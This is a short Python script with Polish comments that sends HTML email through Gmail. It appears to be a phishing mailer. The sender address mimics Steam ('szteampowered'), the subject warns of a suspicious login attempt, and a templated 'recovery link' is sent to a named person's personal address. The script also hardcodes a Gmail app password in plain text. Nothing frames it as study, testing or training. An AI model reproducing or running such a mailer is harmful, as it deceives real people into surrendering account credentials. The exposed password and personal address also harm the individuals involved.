import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#Skrypt do wysyłania maila
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "szteampowered@gmail.com"
EMAIL_PASSWORD = "kuod rbyk ojqc pyag "

# Funkcja do wysyłania e-maila
def send_email(recipient, recovery_link):
    try:
        with open("template.html", "r", encoding="utf-8") as file:
            html_template = file.read()

        html_content = html_template.replace("{{email}}", recipient).replace("{{recovery_link}}", recovery_link)

        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = recipient
        msg["Subject"] = "Podejrzana próba logowania na Twoje konto"

        # Dodajemy treść HTML
        msg.attach(MIMEText(html_content, "html"))

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, recipient, msg.as_string())
        print("E-mail wysłany pomyślnie!")
    except Exception as e:
        print(f"Błąd podczas wysyłania e-maila: {e}")


recipient_email = "zosia.lewkowicz35@wp.pl"
recovery_link = "http://localhost/"

send_email(recipient_email, recovery_link)
